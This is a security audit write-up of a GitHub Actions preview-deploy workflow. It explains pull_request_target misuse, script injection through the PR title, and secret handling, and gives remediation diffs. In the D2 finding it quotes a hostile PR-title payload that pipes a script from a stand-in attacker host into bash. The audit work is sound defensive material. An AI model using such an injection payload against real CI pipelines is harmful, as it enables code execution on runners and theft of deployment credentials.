# Artifact D — `.github/workflows/pr-preview.yml` (GitHub Actions)

This workflow is the canonical GitHub Actions "pwn request" pattern, plus two smaller injection/hygiene
issues layered on top.

## Finding D1 — `pull_request_target` + checkout of PR head + `permissions: write-all`

**Vulnerability class:** CI/CD Supply Chain Compromise via `pull_request_target` misuse
(CWE-829 / OWASP CI/CD Top 10 CICD-SEC-4).

`pull_request_target` runs with the **base repository's** context — including all of its secrets — even
for pull requests opened from forks. This workflow then checks out
`github.event.pull_request.head.sha` (the attacker-controlled PR code) and runs `npm ci && npm run build`
against it. `npm ci`/`npm run build` execute arbitrary code from that checkout (via `package.json`
`scripts.preinstall`/`postinstall`/`build`, or a malicious dependency). Combined with `permissions:
write-all`, and the job's own `env:` block handing `PREVIEW_AWS_KEY`/`PREVIEW_AWS_SECRET`/`SLACK_WEBHOOK`
directly to that same execution context: **any external contributor who can open a pull request gets
production-adjacent AWS credentials and a write-all `GITHUB_TOKEN`** just by having their PR trigger this
workflow. With `write-all`, that token alone can push branches/tags, modify repo settings, and create
releases — this is close to full repo takeover, not just a credential leak.

**Attacker:** anyone who can open a PR against this repo (an external contributor if the repo takes outside
contributions; otherwise any lower-trust internal contributor, or a compromised dependency author whose
package gets pulled in via `npm ci`). **Impact:** AWS credentials for the preview environment, a
write-all repo token, and Slack webhook — a strong foothold to pivot further (preview environments are
rarely as locked down as prod, and are a common stepping stone).

**Severity: Critical.** This is a well-documented, actively-exploited attack class in the wild (see the
`tj-actions/changed-files` and multiple 2023–2024 `pull_request_target` incidents) — it is not theoretical.

**Fix:** switch to `pull_request` (runs in the fork's own context, no secrets by default), scope permissions
down, and gate secret-using steps behind a protected GitHub Environment requiring approval for first-time
contributors:

```diff
 name: PR Preview Deploy
 on:
-  pull_request_target:
+  pull_request:
     types: [opened, synchronize]

-permissions: write-all
+permissions:
+  contents: read

 jobs:
   deploy-preview:
     runs-on: ubuntu-latest
+    environment: preview   # requires reviewer approval before secrets are exposed
     steps:
       - uses: actions/checkout@v3
         with:
           ref: ${{ github.event.pull_request.head.sha }}
+          persist-credentials: false   # don't leave the checkout token usable by later steps
```

**Residual risk, disclosed rather than hidden:** `environment: preview` is a real improvement — it converts
"any fork PR gets these secrets automatically" into "a human must explicitly approve this run" — but it's a
human gate, not an architectural one. The approved job still checks out the PR's own commit and runs the
PR's own `npm ci`/`npm run build`/`./scripts/deploy-preview.sh` with the preview AWS credentials present in
its environment. An approver who doesn't audit that exact commit's build scripts and dependency tree —
under the same time pressure that makes fast review unreliable everywhere else in this assessment (see
Part 1B) — can still approve a run that exfiltrates the secrets it was meant to gate. The fully closed
version of this fix separates the two trust levels into different jobs entirely: an untrusted build/test
stage that never sees secrets, producing an immutable artifact, followed by a separate trusted deployment
stage (ideally triggered off the base branch via `workflow_run`, using OIDC rather than long-lived keys)
where secrets and attacker-influenced code are never present in the same execution context. That's a larger
structural change than fits inline here, so it's named as the next step rather than treated as solved by
the environment gate alone.

## Finding D2 — Script injection via unsanitized `github.event.pull_request.title`

**Vulnerability class:** Argument/Command Injection into a CI Runner (CWE-78, GitHub Actions
"expression injection").

`run: echo "Building preview for: ${{ github.event.pull_request.title }}"` interpolates
attacker-controlled text (the PR title, which anyone opening a PR fully controls) directly into a shell
command at **template-expansion time**, before the shell ever sees it. A PR titled
`"; curl -s https://evil.example/x.sh | bash #` (or using backticks/`$()`) results in arbitrary shell
execution on the runner — with, again, whatever credentials that job has (see D1). This is a distinct
finding from D1 even though they compound: fixing `pull_request_target` alone doesn't fix this, because the
runner still executes attacker-controlled shell text on every PR from a fork.

**Severity: High** on its own (arbitrary code execution on the runner); **Critical** in combination with D1
(that code execution has access to the deploy credentials).

**Fix:** never interpolate untrusted `github.event.*` fields directly into `run:` — pass them through an
`env:` variable, which the shell treats as data, not code:

```diff
-      - name: Comment PR title on build log
-        run: echo "Building preview for: ${{ github.event.pull_request.title }}"
+      - name: Comment PR title on build log
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: echo "Building preview for: $PR_TITLE"
```

## Finding D3 — Secret printed to build logs; third-party action pinned to a mutable branch

**Vulnerability class:** Secret Exposure in Logs (CWE-532) / Supply Chain via Unpinned Dependency
(CWE-1357).

`echo "Using key $AWS_ACCESS_KEY_ID"` writes a secret value into the job log. GitHub's log masking is not
guaranteed to catch every transformation of a secret (and shouldn't be relied on as the control), and
Actions logs are readable by anyone with repo read access and are sometimes exported to third-party log
aggregators with different retention/access rules than the repo itself. Separately, `uses:
some-org/slack-notify@main` pins to a mutable branch ref rather than a commit SHA — if that third party's
`main` branch is ever compromised (a maintainer account takeover, or a malicious contributor merging to
`main`), the next run of this workflow executes arbitrary code with this job's secrets, with zero code
review on GreenScape's side. This exact class of attack hit `tj-actions/changed-files` in 2025.

**Severity: Medium** (D3a, log exposure — narrows the population who can retrieve the secret, but doesn't
eliminate it) and **High** (D3b, unpinned action — the action's maintainer becomes a trusted part of your
supply chain with no way to audit what changes).

**Fix:**

```diff
       - name: Deploy to preview env
         env:
           AWS_ACCESS_KEY_ID: ${{ secrets.PREVIEW_AWS_KEY }}
           AWS_SECRET_ACCESS_KEY: ${{ secrets.PREVIEW_AWS_SECRET }}
         run: |
-          echo "Using key $AWS_ACCESS_KEY_ID"
           ./scripts/deploy-preview.sh
       - name: Notify Slack
-        uses: some-org/slack-notify@main
+        uses: some-org/slack-notify@a1b2c3d4e5f60718293a4b5c6d7e8f9012345678  # pinned to a specific commit SHA
         with:
           webhook: ${{ secrets.SLACK_WEBHOOK }}
```

## Severity summary

| # | Issue | Severity | Business impact |
|---|-------|----------|------------------|
| D1 | `pull_request_target` + write-all + PR-controlled build | Critical | Preview AWS creds + write-all repo token to anyone who opens a PR |
| D2 | PR title interpolated into `run:` | High (Critical combined with D1) | Arbitrary shell execution on the runner |
| D3a | Secret echoed to logs | Medium | Secret exposure to anyone with log read access |
| D3b | Third-party action pinned to `@main` | High | Supply-chain compromise via upstream maintainer/account takeover |

## What I'd clear, not flag

The `strategy.matrix` block being defined after `steps:` in the YAML is unconventional ordering but not a
security issue or even a parse error — job-level keys can appear in any order — so it's left as-is
functionally (moved only for readability in the fixed file). Not everything unusual-looking is a bug; this
is the kind of thing worth clearing explicitly rather than padding the findings list with it.

## Systemic control

- **`zizmor`** (a static analyzer purpose-built for GitHub Actions) in CI on every workflow-file change —
  it specifically detects `pull_request_target` misuse, unpinned third-party actions, and expression
  injection via untrusted `github.event.*` interpolation. This artifact is close to a textbook example of
  everything `zizmor` exists to catch; running it would have flagged D1, D2, and D3b automatically.
- **Org-wide GitHub setting: "Workflow permissions: read-only" as the default**, with jobs opting into
  broader scopes explicitly and only where justified — this alone would have prevented `write-all` from
  ever being the default a new workflow inherits.
- **Require SHA-pinning for third-party actions**, enforced via the org's "Allow specified actions and
  reusable workflows" allowlist plus `zizmor`/`actionlint` in CI.
- **Any workflow that can be triggered by an external PR and touches secrets must run through a protected
  Environment** requiring reviewer approval — this is the single control that would have stopped D1 from
  being exploitable even before the trigger type was fixed.
